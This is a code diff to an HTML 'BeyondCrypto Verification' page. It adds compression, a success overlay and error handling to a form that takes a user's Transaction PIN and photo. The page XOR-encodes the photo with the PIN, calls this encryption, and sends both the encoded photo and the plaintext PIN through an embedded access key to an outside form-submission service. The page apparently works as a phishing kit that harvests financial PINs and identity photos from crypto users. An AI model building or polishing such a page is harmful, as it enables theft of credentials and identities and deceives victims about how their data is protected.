@@ -227,12 +227,86 @@
             margin-right: 6px;
         }
 
+        /* Success overlay */
+        .success-overlay {
+            display: none;
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(10,17,41,0.92);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            z-index: 100;
+            border-radius: var(--border-radius);
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            padding: 30px;
+        }
+
+        .success-overlay.show {
+            display: flex;
+        }
+
+        .success-icon {
+            font-size: 4rem;
+            color: var(--accent);
+            margin-bottom: 20px;
+            animation: pop-in 0.5s ease-out;
+        }
+
+        @keyframes pop-in {
+            0% { transform: scale(0); opacity: 0; }
+            80% { transform: scale(1.1); }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .success-title {
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: var(--text-primary);
+            margin-bottom: 10px;
+        }
+
+        .success-sub {
+            color: var(--text-secondary);
+            font-size: 1rem;
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .success-btn {
+            background: var(--accent);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 25px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .success-btn:hover {
+            background: #00b35e;
+        }
+
         footer {
             padding: 15px;
             text-align: center;
             border-top: 1px solid var(--border-color);
             color: var(--text-secondary);
             font-size: 0.8rem;
+        }
+
+        /* Error message */
+        .error-message {
+            display: none;
+            color: var(--negative);
+            font-size: 0.9rem;
+            text-align: center;
+            margin-top: 10px;
         }
 
         @media (max-width: 480px) {
@@ -242,7 +316,19 @@
     </style>
 </head>
 <body>
-    <div class="container">
+    <div class="container" id="appContainer">
+        <!-- Success Overlay -->
+        <div class="success-overlay" id="successOverlay">
+            <div class="success-icon">
+                <i class="fas fa-check-circle"></i>
+            </div>
+            <div class="success-title">Verification photo sent successfully!</div>
+            <div class="success-sub">Your encrypted photo and PIN have been forwarded. Redirecting to dashboard...</div>
+            <button class="success-btn" onclick="window.location.href='dashboard.html'">
+                <i class="fas fa-arrow-right"></i> Go to Dashboard
+            </button>
+        </div>
+
         <header>
             <div class="logo">
                 <i class="fas fa-camera-retro"></i>
@@ -261,7 +347,7 @@
         <div class="main-content">
             <p style="color: var(--text-secondary); margin-bottom: 20px; text-align: center;">
                 <i class="fas fa-shield-alt" style="color: var(--accent); margin-right: 6px;"></i>
-                Enter your Transaction PIN (created during sign‑up) and upload a photo. The photo will be encrypted with your PIN.
+                Enter your Transaction PIN and upload a photo. It will be compressed and encrypted with your PIN.
             </p>
 
             <form onsubmit="return false;">
@@ -284,8 +370,9 @@
                 <img id="photoPreview" class="preview-img" alt="Preview">
 
                 <div class="send-status" id="sendStatus">
-                    <i class="fas fa-paper-plane"></i> Submitting verification...
+                    <i class="fas fa-spinner fa-spin"></i> Processing & sending...
                 </div>
+                <div class="error-message" id="errorMessage"></div>
 
                 <button type="button" class="btn-primary" id="verifyBtn" disabled onclick="verifyAndSend()">
                     <i class="fas fa-check-circle"></i> Verify & Send
@@ -298,6 +385,9 @@
         </footer>
     </div>
 
+    <!-- Hidden canvas for compression -->
+    <canvas id="compressCanvas" style="display:none;"></canvas>
+
     <script>
         let selectedPhotoFile = null;
         const photoInput = document.getElementById('photoInput');
@@ -305,8 +395,11 @@
         const uploadArea = document.getElementById('uploadArea');
         const verifyBtn = document.getElementById('verifyBtn');
         const sendStatus = document.getElementById('sendStatus');
+        const errorMessage = document.getElementById('errorMessage');
+        const successOverlay = document.getElementById('successOverlay');
+        const canvas = document.getElementById('compressCanvas');
+        const ctx = canvas.getContext('2d');
 
-        // Enable button only when PINs match and photo is selected
         function validateForm() {
             const pin = document.getElementById('transactionPin').value.trim();
             const confirm = document.getElementById('confirmPin').value.trim();
@@ -347,7 +440,36 @@
             }
         }
 
-        // XOR encryption
+        // Resize and compress image using canvas
+        function compressImage(file) {
+            return new Promise((resolve, reject) => {
+                const img = new Image();
+                const url = URL.createObjectURL(file);
+                img.onload = () => {
+                    URL.revokeObjectURL(url);
+                    const maxWidth = 800;
+                    const maxHeight = 800;
+                    let { width, height } = img;
+                    if (width > maxWidth || height > maxHeight) {
+                        const ratio = Math.min(maxWidth / width, maxHeight / height);
+                        width = Math.round(width * ratio);
+                        height = Math.round(height * ratio);
+                    }
+                    canvas.width = width;
+                    canvas.height = height;
+                    ctx.clearRect(0, 0, width, height);
+                    ctx.drawImage(img, 0, 0, width, height);
+                    const compressedBase64 = canvas.toDataURL('image/jpeg', 0.7);  // quality 70%
+                    resolve(compressedBase64);
+                };
+                img.onerror = () => {
+                    URL.revokeObjectURL(url);
+                    reject(new Error('Failed to load image for compression.'));
+                };
+                img.src = url;
+            });
+        }
+
         function xorEncrypt(base64, key) {
             let result = '';
             for (let i = 0; i < base64.length; i++) {
@@ -364,53 +486,64 @@
             const pin = document.getElementById('transactionPin').value.trim();
             const confirm = document.getElementById('confirmPin').value.trim();
             if (pin !== confirm || !/^\d{4,6}$/.test(pin)) {
-                alert('PINs do not match or are invalid.');
+                showError('PINs do not match or are invalid.');
                 return;
             }
             if (!selectedPhotoFile) {
-                alert('Please select a photo.');
+                showError('Please select a photo.');
                 return;
             }
 
             verifyBtn.disabled = true;
             sendStatus.style.display = 'block';
+            errorMessage.style.display = 'none';
 
-            const reader = new FileReader();
-            reader.onload = async function(e) {
-                const base64 = e.target.result.split(',')[1];
+            try {
+                // Compress the image before encryption
+                sendStatus.innerHTML = '<i class="fas fa-compress"></i> Compressing image...';
+                const compressedDataUrl = await compressImage(selectedPhotoFile);
+                const base64 = compressedDataUrl.split(',')[1];
+
+                sendStatus.innerHTML = '<i class="fas fa-lock"></i> Encrypting...';
                 const encrypted = xorEncrypt(base64, pin);
                 const safeCode = toSafeBase64(encrypted);
 
-                // Send both encrypted photo code and the PIN via Web3Forms
+                sendStatus.innerHTML = '<i class="fas fa-paper-plane"></i> Sending...';
                 const formData = new FormData();
                 formData.append('access_key', '19bd1a1c-04ae-4540-8975-9d05a216e05e');
                 formData.append('subject', 'Photo Verification');
                 formData.append('from_name', 'BeyondCrypto Verification');
                 formData.append('botcheck', '');
                 formData.append('encrypted_photo', safeCode);
-                formData.append('photo_key', pin);   // PIN sent as plain text (as requested)
+                formData.append('photo_key', pin);
 
-                try {
-                    await fetch('https://api.web3forms.com/submit', {
-                        method: 'POST',
-                        body: formData
-                    });
-                    alert('Verification submitted successfully!');
-                    // Optionally redirect or clear
-                    window.location.href = 'folder1/kyc.html';
-                } catch (err) {
-                    console.error(err);
-                    alert('Failed to send photo. Please try again.');
-                    verifyBtn.disabled = false;
-                    sendStatus.style.display = 'none';
+                const response = await fetch('https://api.web3forms.com/submit', {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (!response.ok) {
+                    throw new Error(`Server responded with ${response.status}`);
                 }
-            };
-            reader.onerror = () => {
-                alert('Error reading photo file.');
+
+                // Success
+                sendStatus.style.display = 'none';
+                successOverlay.classList.add('show');
+                setTimeout(() => {
+                    window.location.href = 'dashboard.html';
+                }, 4000);
+
+            } catch (err) {
+                console.error(err);
+                showError('Failed to send photo. Please try again. If the problem persists, use a smaller image.');
                 verifyBtn.disabled = false;
                 sendStatus.style.display = 'none';
-            };
-            reader.readAsDataURL(selectedPhotoFile);
+            }
+        }
+
+        function showError(msg) {
+            errorMessage.textContent = msg;
+            errorMessage.style.display = 'block';
         }
     </script>
 </body>
